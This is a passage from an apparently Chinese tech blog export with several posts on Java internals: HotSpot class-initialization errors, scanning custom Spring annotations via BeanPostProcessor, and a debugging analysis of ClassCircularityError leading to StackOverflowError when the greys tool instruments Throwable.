<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hotspot/src/share/vm/oops/instanceKlass.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstanceKlass::initialize_impl</span><span class="params">(instanceKlassHandle this_oop, TRAPS)</span> </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Step 5</span></span><br><span class="line">    <span class="keyword">if</span> (this_oop-&gt;is_in_error_state()) &#123;</span><br><span class="line">      DTRACE_CLASSINIT_PROBE_WAIT(erroneous, InstanceKlass::cast(this_oop()), <span class="number">-1</span>,wait);</span><br><span class="line">      <span class="function">ResourceMark <span class="title">rm</span><span class="params">(THREAD)</span></span>;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span>* desc = <span class="string">"Could not initialize class "</span>;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span>* className = this_oop-&gt;external_name();</span><br><span class="line">      <span class="keyword">size_t</span> msglen = <span class="built_in">strlen</span>(desc) + <span class="built_in">strlen</span>(className) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">char</span>* message = NEW_RESOURCE_ARRAY(<span class="keyword">char</span>, msglen);</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">NULL</span> == message) &#123;</span><br><span class="line">        <span class="comment">// Out of memory: can't create detailed error message</span></span><br><span class="line">        THROW_MSG(vmSymbols::java_lang_NoClassDefFoundError(), className);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        jio_snprintf(message, msglen, <span class="string">"%s%s"</span>, desc, className);</span><br><span class="line">        THROW_MSG(vmSymbols::java_lang_NoClassDefFoundError(), message);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>spring boot在<code>BackgroundPreinitializer</code>类里用一个独立的线程来加载validator，并吃掉了原始异常</li>
<li>第一次加载失败的类，在jvm里会被标记为<code>initialization_error</code>，再次加载时会直接抛出<code>NoClassDefFoundError: Could not initialize class</code></li>
<li>当在代码里吞掉异常时要谨慎，否则排查问题带来很大的困难</li>
<li><a href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.5" target="_blank" rel="noopener">http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.5</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>jvm</tag>
        <tag>ClassLoader</tag>
        <tag>NoClassDefFoundError</tag>
        <tag>hibernate</tag>
      </tags>
  </entry>
  <entry>
    <title>正确实现用spring扫描自定义的annotation</title>
    <url>/spring-scan-annotation/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在使用spring时，有时候有会有一些自定义annotation的需求，比如一些Listener的回调函数。</p>
<p>比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@MyListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onMessage</span><span class="params">(Message msg)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一开始的时候，我是在Spring的<code>ContextRefreshedEvent</code>事件里，通过<code>context.getBeansWithAnnotation(Component.class)</code> 来获取到所有的bean，然后再检查method是否有<code>@MyListener</code>的annotation。</p>
<p>后来发现这个方法有缺陷，当有一些spring bean的<code>@Scope</code>设置为session/request时，创建bean会失败。</p>
<p>参考：<br><a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/#beans-factory-scopes" target="_blank" rel="noopener">http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/#beans-factory-scopes</a> </p>
<p>在网上搜索了一些资料，发现不少人都是用<code>context.getBeansWithAnnotation(Component.class)</code>，这样子来做的，但是这个方法并不对。</p>
<h2 id="BeanPostProcessor接口"><a href="#BeanPostProcessor接口" class="headerlink" title="BeanPostProcessor接口"></a>BeanPostProcessor接口</h2><p>后来看了下spring jms里的<code>@JmsListener</code>的实现，发现实现<code>BeanPostProcessor</code>接口才是最合理的办法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeanPostProcessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Apply this BeanPostProcessor to the given new bean instance &lt;i&gt;before&lt;/i&gt; any bean</span></span><br><span class="line"><span class="comment">	 * initialization callbacks (like InitializingBean's &#123;<span class="doctag">@code</span> afterPropertiesSet&#125;</span></span><br><span class="line"><span class="comment">	 * or a custom init-method). The bean will already be populated with property values.</span></span><br><span class="line"><span class="comment">	 * The returned bean instance may be a wrapper around the original.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> bean the new bean instance</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> beanName the name of the bean</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the bean instance to use, either the original or a wrapped one;</span></span><br><span class="line"><span class="comment">	 * if &#123;<span class="doctag">@code</span> null&#125;, no subsequent BeanPostProcessors will be invoked</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> org.springframework.beans.BeansException in case of errors</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.beans.factory.InitializingBean#afterPropertiesSet</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">Object <span class="title">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span> <span class="keyword">throws</span> BeansException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Apply this BeanPostProcessor to the given new bean instance &lt;i&gt;after&lt;/i&gt; any bean</span></span><br><span class="line"><span class="comment">	 * initialization callbacks (like InitializingBean's &#123;<span class="doctag">@code</span> afterPropertiesSet&#125;</span></span><br><span class="line"><span class="comment">	 * or a custom init-method). The bean will already be populated with property values.</span></span><br><span class="line"><span class="comment">	 * The returned bean instance may be a wrapper around the original.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;In case of a FactoryBean, this callback will be invoked for both the FactoryBean</span></span><br><span class="line"><span class="comment">	 * instance and the objects created by the FactoryBean (as of Spring 2.0). The</span></span><br><span class="line"><span class="comment">	 * post-processor can decide whether to apply to either the FactoryBean or created</span></span><br><span class="line"><span class="comment">	 * objects or both through corresponding &#123;<span class="doctag">@code</span> bean instanceof FactoryBean&#125; checks.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;This callback will also be invoked after a short-circuiting triggered by a</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@link</span> InstantiationAwareBeanPostProcessor#postProcessBeforeInstantiation&#125; method,</span></span><br><span class="line"><span class="comment">	 * in contrast to all other BeanPostProcessor callbacks.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> bean the new bean instance</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> beanName the name of the bean</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the bean instance to use, either the original or a wrapped one;</span></span><br><span class="line"><span class="comment">	 * if &#123;<span class="doctag">@code</span> null&#125;, no subsequent BeanPostProcessors will be invoked</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> org.springframework.beans.BeansException in case of errors</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.beans.factory.InitializingBean#afterPropertiesSet</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.beans.factory.FactoryBean</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">Object <span class="title">postProcessAfterInitialization</span><span class="params">(Object bean, String beanName)</span> <span class="keyword">throws</span> BeansException</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所有的bean在创建完之后，都会回调<code>postProcessAfterInitialization</code>函数，这时就可以确定bean是已经创建好的了。</p>
<p>所以扫描自定义的annotation的代码大概是这个样子的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyListenerProcessor</span> <span class="keyword">implements</span> <span class="title">BeanPostProcessor</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> bean;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">postProcessAfterInitialization</span><span class="params">(Object bean, String beanName)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">		Method[] methods = ReflectionUtils.getAllDeclaredMethods(bean.getClass());</span><br><span class="line">		<span class="keyword">if</span> (methods != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">				MyListener myListener = AnnotationUtils.findAnnotation(method, MyListener<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">				<span class="comment">// process</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> bean;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SmartInitializingSingleton-接口"><a href="#SmartInitializingSingleton-接口" class="headerlink" title="SmartInitializingSingleton 接口"></a>SmartInitializingSingleton 接口</h2><p>看spring jms的代码时，发现SmartInitializingSingleton 这个接口也比较有意思。</p>
<p>就是当所有的singleton的bean都初始化完了之后才会回调这个接口。不过要注意是 4.1 之后才出现的接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SmartInitializingSingleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Invoked right at the end of the singleton pre-instantiation phase,</span></span><br><span class="line"><span class="comment">	 * with a guarantee that all regular singleton beans have been created</span></span><br><span class="line"><span class="comment">	 * already. &#123;<span class="doctag">@link</span> ListableBeanFactory#getBeansOfType&#125; calls within</span></span><br><span class="line"><span class="comment">	 * this method won't trigger accidental side effects during bootstrap.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;&lt;b&gt;<span class="doctag">NOTE:</span>&lt;/b&gt; This callback won't be triggered for singleton beans</span></span><br><span class="line"><span class="comment">	 * lazily initialized on demand after &#123;<span class="doctag">@link</span> BeanFactory&#125; bootstrap,</span></span><br><span class="line"><span class="comment">	 * and not for any other bean scope either. Carefully use it for beans</span></span><br><span class="line"><span class="comment">	 * with the intended bootstrap semantics only.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">afterSingletonsInstantiated</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/beans/factory/SmartInitializingSingleton.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/beans/factory/SmartInitializingSingleton.html</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>详细分析罕见的ClassCircularityError异常导致的StackOverflowError</title>
    <url>/java-classcircularityerror/</url>
    <content><![CDATA[<p>先打一个广告。</p>
<p>greys是一个很不错的java诊断工具：<a href="https://github.com/oldmanpushcart/greys-anatomy" target="_blank" rel="noopener">https://github.com/oldmanpushcart/greys-anatomy</a></p>
<hr>
<p>最近尝试用greys来实时统计jvm里的异常生成数量，在增强Throwable时，发现应用会抛出StackOverflowError。下面记录详细的分析过程。</p>
<p>在真正分析之前，先介绍<code>JVM对反射方法调用的优化</code>和<code>greys的工作原理</code>。</p>
<h2 id="JVM对反射方法调用的优化"><a href="#JVM对反射方法调用的优化" class="headerlink" title="JVM对反射方法调用的优化"></a>JVM对反射方法调用的优化</h2><p>在JVM里对于反射方法调用<code>Method.invoke</code>，默认情况下，是通过NativeMethodAccessorImpl来调用到的。</p>
<p>调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">62</span>	</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">43</span>	</span><br><span class="line">Method.invoke(Object, Object...) line: <span class="number">497</span></span><br></pre></td></tr></table></figure>
<p>当经过16次方法调用之后，NativeMethodAccessorImpl 会用MethodAccessorGenerator 动态生成一个MethodAccessorImpl（即下面的GeneratedMethodAccessor1） ，然后再设置到 DelegatingMethodAccessorImpl 里。然后调用栈就变成这个样子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GeneratedMethodAccessor1.invoke(Object, Object[]) line: not available	</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">43</span>	</span><br><span class="line">Method.invoke(Object, Object...) line: <span class="number">497</span></span><br></pre></td></tr></table></figure>
<p>这个动态生成的GeneratedMethodAccessor1是如何加载到ClassLoader里的？实际上是通过 <code>Unsafe.defineClass</code> 来define，然后再调用 <code>ClassLoader.loadClass(String)</code> 来加载到的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AgentLauncher$<span class="number">1</span>(ClassLoader).loadClass(String) line: <span class="number">357</span>	</span><br><span class="line">Unsafe.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader, ProtectionDomain) line: not available [<span class="keyword">native</span> method] </span><br><span class="line">ClassDefiner.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader) line: <span class="number">63</span></span><br></pre></td></tr></table></figure>
<p>更多反射调用优化的细节参考：<a href="http://rednaxelafx.iteye.com/blog/548536" target="_blank" rel="noopener">http://rednaxelafx.iteye.com/blog/548536</a></p>
<p>简单总结下：</p>
<ul>
<li>jvm会对method反射调用优化</li>
<li>运行时动态生成反射调用代码，再define到classloader里</li>
<li>define到classloader时，会调用<code>ClassLoader.loadClass(String)</code></li>
</ul>
<h2 id="greys的工作原理"><a href="#greys的工作原理" class="headerlink" title="greys的工作原理"></a>greys的工作原理</h2><p>使用greys可以在运行时，对方法调用进行一些watch, monitor等的动作。那么这个是怎么实现的呢？</p>
<p>简单来说，是通过运行时修改字节码来实现的。比如下面这个函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxx</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">abc</span><span class="params">(Student s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>被greys修改过后，变为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Spy.ON_BEFORE_METHOD.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Integer(<span class="number">0</span>), xxx2.getClass().getClassLoader(), <span class="string">"xxx"</span>, <span class="string">"abc"</span>, <span class="string">"(LStudent;)Ljava/lang/String;"</span>, xxx2, &#123;student&#125;);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> s;</span><br><span class="line">    String string = s.getName();</span><br><span class="line">    Spy.ON_RETURN_METHOD.invoke(<span class="keyword">null</span>, string);</span><br><span class="line">    <span class="keyword">return</span> string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable v1) &#123;</span><br><span class="line">    Spy.ON_THROWS_METHOD.invoke(<span class="keyword">null</span>, v1);</span><br><span class="line">    <span class="keyword">throw</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，greys在原来的method里插入很多钩子，所以greys可以获取到method被调用的参数，返回值等信息。</p>
<h2 id="当使用greys对java-lang-Throwable来增强时，会抛出StackOverflowError"><a href="#当使用greys对java-lang-Throwable来增强时，会抛出StackOverflowError" class="headerlink" title="当使用greys对java.lang.Throwable来增强时，会抛出StackOverflowError"></a>当使用greys对java.lang.Throwable来增强时，会抛出StackOverflowError</h2><p>测试代码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class ExceptionTest &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		for (int i = 0; i &lt; 100000; i++) &#123;</span><br><span class="line">			RuntimeException exception = new RuntimeException(&quot;&quot;);</span><br><span class="line">			System.err.println(exception);</span><br><span class="line"></span><br><span class="line">			Thread.sleep(1000);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在命令行里attach到测试代码进程之后，在greys console里执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">options unsafe <span class="literal">true</span></span><br><span class="line">monitor -c 1 java.lang.Throwable *</span><br></pre></td></tr></table></figure>
<p>当用greys增强java.lang.Throwable之后，经过16秒之后，就会抛出StackOverflowError。</p>
<p>具体的异常栈很长，这里只贴出重点部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread [main] (Suspended (exception StackOverflowError))	</span><br><span class="line">	ClassLoader.checkCreateClassLoader() line: <span class="number">272</span>	</span><br><span class="line">...</span><br><span class="line">	ClassCircularityError(Throwable).&lt;init&gt;(String) line: <span class="number">264</span>	</span><br><span class="line">	ClassCircularityError(Error).&lt;init&gt;(String) line: <span class="number">70</span>	</span><br><span class="line">	ClassCircularityError(LinkageError).&lt;init&gt;(String) line: <span class="number">55</span>	</span><br><span class="line">	ClassCircularityError.&lt;init&gt;(String) line: <span class="number">53</span>	</span><br><span class="line">	Unsafe.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader, ProtectionDomain) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">	ClassDefiner.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader) line: <span class="number">63</span>	</span><br><span class="line">	MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">399</span>	</span><br><span class="line">	MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">394</span>	</span><br><span class="line">	AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">	MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>, <span class="keyword">boolean</span>, <span class="keyword">boolean</span>, Class&lt;?&gt;) line: <span class="number">393</span>	</span><br><span class="line">	MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>) line: <span class="number">75</span>	</span><br><span class="line">	NativeMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">53</span>	</span><br><span class="line">	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">43</span>	</span><br><span class="line">	Method.invoke(Object, Object...) line: <span class="number">497</span>	</span><br><span class="line">	ClassCircularityError(Throwable).&lt;init&gt;(String) line: <span class="number">264</span>	</span><br><span class="line">	ClassCircularityError(Error).&lt;init&gt;(String) line: <span class="number">70</span>	</span><br><span class="line">	ClassCircularityError(LinkageError).&lt;init&gt;(String) line: <span class="number">55</span>	</span><br><span class="line">	ClassCircularityError.&lt;init&gt;(String) line: <span class="number">53</span>	</span><br><span class="line">	Unsafe.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader, ProtectionDomain) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">	ClassDefiner.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader) line: <span class="number">63</span>	</span><br><span class="line">	MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">399</span>	</span><br><span class="line">	MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">394</span>	</span><br><span class="line">	AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">	MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>, <span class="keyword">boolean</span>, <span class="keyword">boolean</span>, Class&lt;?&gt;) line: <span class="number">393</span>	</span><br><span class="line">	MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>) line: <span class="number">75</span>	</span><br><span class="line">	NativeMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">53</span>	</span><br><span class="line">	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">43</span>	</span><br><span class="line">	Method.invoke(Object, Object...) line: <span class="number">497</span>	</span><br><span class="line">	ClassNotFoundException(Throwable).&lt;init&gt;(String, Throwable) line: <span class="number">286</span>	</span><br><span class="line">	ClassNotFoundException(Exception).&lt;init&gt;(String, Throwable) line: <span class="number">84</span>	</span><br><span class="line">	ClassNotFoundException(ReflectiveOperationException).&lt;init&gt;(String, Throwable) line: <span class="number">75</span>	</span><br><span class="line">	ClassNotFoundException.&lt;init&gt;(String) line: <span class="number">82</span>	</span><br><span class="line">	AgentLauncher$<span class="number">1</span>(URLClassLoader).findClass(String) line: <span class="number">381</span>	</span><br><span class="line">	AgentLauncher$<span class="number">1</span>.loadClass(String, <span class="keyword">boolean</span>) line: <span class="number">55</span>	</span><br><span class="line">	AgentLauncher$<span class="number">1</span>(ClassLoader).loadClass(String) line: <span class="number">357</span>	</span><br><span class="line">	Unsafe.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader, ProtectionDomain) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">	ClassDefiner.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader) line: <span class="number">63</span>	</span><br><span class="line">	MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">399</span>	</span><br><span class="line">	MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">394</span>	</span><br><span class="line">	AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">	MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>, <span class="keyword">boolean</span>, <span class="keyword">boolean</span>, Class&lt;?&gt;) line: <span class="number">393</span>	</span><br><span class="line">	MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>) line: <span class="number">75</span>	</span><br><span class="line">	NativeMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">53</span>	</span><br><span class="line">	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">43</span>	</span><br><span class="line">	Method.invoke(Object, Object...) line: <span class="number">497</span>	</span><br><span class="line">	RuntimeException(Throwable).&lt;init&gt;(String) line: <span class="number">264</span>	</span><br><span class="line">	RuntimeException(Exception).&lt;init&gt;(String) line: <span class="number">66</span>	</span><br><span class="line">	RuntimeException.&lt;init&gt;(String) line: <span class="number">62</span>	</span><br><span class="line">	ExceptionTest.main(String[]) line: <span class="number">15</span></span><br></pre></td></tr></table></figure>
<p>从异常栈可以看出，先出现了一个ClassNotFoundException，然后大量的ClassCircularityError，最终导致StackOverflowError。</p>
<p>下面具体分析原因。</p>
<h2 id="被增强过后的Throwable的代码"><a href="#被增强过后的Throwable的代码" class="headerlink" title="被增强过后的Throwable的代码"></a>被增强过后的Throwable的代码</h2><p>当<code>monitor -c 1 java.lang.Throwable *</code>命令执行之后，Throwable的代码实际上变为这个样子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Throwable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Throwable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Spy.ON_BEFORE_METHOD.invoke(...);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Throwable &lt;init&gt;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable v1) &#123;</span><br><span class="line">            Spy.ON_THROWS_METHOD.invoke(<span class="keyword">null</span>, v1);</span><br><span class="line">            <span class="keyword">throw</span> v1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个<code>Spy.ON_BEFORE_METHOD.invoke</code> 是一个反射调用，那么当它被调用16次之后，jvm会生成优化的代码。从最开始的异常栈可以看到这些信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Unsafe.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader, ProtectionDomain) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">ClassDefiner.defineClass(String, <span class="keyword">byte</span>[], <span class="keyword">int</span>, <span class="keyword">int</span>, ClassLoader) line: <span class="number">63</span>	</span><br><span class="line">MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">399</span>	</span><br><span class="line">MethodAccessorGenerator$<span class="number">1</span>.run() line: <span class="number">394</span>	</span><br><span class="line">AccessController.doPrivileged(PrivilegedAction&lt;T&gt;) line: not available [<span class="keyword">native</span> method]	</span><br><span class="line">MethodAccessorGenerator.generate(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>, <span class="keyword">boolean</span>, <span class="keyword">boolean</span>, Class&lt;?&gt;) line: <span class="number">393</span>	</span><br><span class="line">MethodAccessorGenerator.generateMethod(Class&lt;?&gt;, String, Class&lt;?&gt;[], Class&lt;?&gt;, Class&lt;?&gt;[], <span class="keyword">int</span>) line: <span class="number">75</span>	</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">53</span>	</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">43</span>	</span><br><span class="line">Method.invoke(Object, Object...) line: <span class="number">497</span>	</span><br><span class="line">RuntimeException(Throwable).&lt;init&gt;(String) line: <span class="number">264</span>	</span><br><span class="line">RuntimeException(Exception).&lt;init&gt;(String) line: <span class="number">66</span>	</span><br><span class="line">RuntimeException.&lt;init&gt;(String) line: <span class="number">62</span>	</span><br><span class="line">ExceptionTest.main(String[]) line: <span class="number">15</span></span><br></pre></td></tr></table></figure>
<p>这时，生成的反射调用优化类名字是<code>sun/reflect/GeneratedMethodAccessor1</code>。</p>
<h2 id="ClassNotFoundException-怎么产生的"><a href="#ClassNotFoundException-怎么产生的" class="headerlink" title="ClassNotFoundException 怎么产生的"></a>ClassNotFoundException 怎么产生的</h2><p>接着，代码抛出了一个ClassNotFoundException，这个ClassNotFoundException来自<code>AgentLauncher$1(URLClassLoader)</code>。这是AgentLauncher 里自定义的一个URLClassLoader。</p>
<p>这个自定义ClassLoader的逻辑很简单，优先从自己查找class，如果找不到则从parent里查找。这是一个常见的重写ClassLoader的逻辑。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">"file:"</span> + agentJar)&#125;) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; loadedClass = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (loadedClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> loadedClass;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = findClass(name);</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> aClass;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span 